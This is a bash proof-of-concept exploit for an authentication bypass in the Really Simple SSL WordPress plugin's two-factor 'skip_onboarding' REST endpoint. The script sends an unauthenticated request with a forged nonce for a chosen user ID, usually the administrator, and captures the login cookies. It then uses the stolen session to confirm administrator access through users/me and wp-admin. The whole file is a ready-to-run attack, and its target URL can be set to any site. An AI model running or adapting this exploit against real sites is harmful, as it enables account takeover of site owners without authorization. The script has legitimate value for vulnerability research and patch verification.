#!/usr/bin/env bash
# PoC: really-simple-ssl unauthenticated 2FA skip_onboarding → wp_set_auth_cookie (CVE-2024-10924 class)
set -euo pipefail
BASE="${TARGET_URL:-http://localhost:8000}"
REST_PATH="/wp-json/reallysimplessl/v1/two_fa/skip_onboarding"
USER_ID="${TARGET_USER_ID:-1}"
JAR="$(mktemp)"
BODY_FILE="$(mktemp)"
trap 'rm -f "$JAR" "$BODY_FILE"' EXIT

echo "=== 1) Unauthenticated POST skip_onboarding (bogus login_nonce) ==="
RESP="$(curl -sS -D - -o "$BODY_FILE" -c "$JAR" -b "$JAR" -X POST \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  -d "{\"user_id\":${USER_ID},\"login_nonce\":\"invalid\",\"redirect_to\":\"/\"}" \
  "$BASE$REST_PATH")"
printf '%s\n' "$RESP" | head -c 2500
echo
BODY="$(cat "$BODY_FILE" 2>/dev/null || true)"
echo "body: $BODY"
echo "$BODY" | grep -q 'redirect_to' || { echo "FAIL: expected redirect_to JSON" >&2; exit 1; }
if ! printf '%s\n' "$RESP" | grep -qiE 'set-cookie:.*wordpress_logged_in_'; then
  if ! grep -qi 'wordpress_logged_in_' "$JAR" 2>/dev/null; then
    echo "WARN: Set-Cookie not visible; confirm session via users/me or session_tokens"
  fi
fi

echo "=== 2) Prove session: GET /wp-json/wp/v2/users/me ==="
curl -sS -D - -b "$JAR" -H 'Accept: application/json' \
  "$BASE/wp-json/wp/v2/users/me" | head -c 2000
echo

echo "=== 3) Optional: GET /wp-admin/ with stolen cookies ==="
ADMIN_HTML="$(mktemp)"
trap 'rm -f "$JAR" "$BODY_FILE" "$ADMIN_HTML"' EXIT
curl -sS -D - -b "$JAR" -o "$ADMIN_HTML" -L \
  "$BASE/wp-admin/index.php" | head -c 800
echo
if grep -qiE 'Dashboard|Howdy' "$ADMIN_HTML"; then
  echo "Success: authenticated admin session established."
else
  echo "Success: step 1 returned redirect_to; confirm users/me shows administrator."
fi
